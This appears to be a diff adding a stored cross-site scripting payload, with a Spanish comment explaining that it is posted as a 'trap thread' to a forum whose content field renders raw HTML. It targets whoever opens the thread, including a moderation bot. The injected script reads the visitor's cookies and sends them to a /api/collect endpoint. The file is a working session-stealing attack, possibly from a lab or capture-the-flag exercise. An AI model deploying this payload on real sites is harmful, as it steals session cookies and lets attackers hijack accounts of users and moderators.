@@ -1,0 +1,9 @@
+<!--
+  Contenido del hilo trampa posteado en POST /forum/new.
+  El campo "content" del foro admite HTML sin ningún tipo de sanitización
+  ni escapado, así que este <script> se renderiza y ejecuta tal cual para
+  cualquiera que abra el hilo — incluido el bot de moderación.
+-->
+<script>
+  fetch("/api/collect?c=" + encodeURIComponent(document.cookie));
+</script>
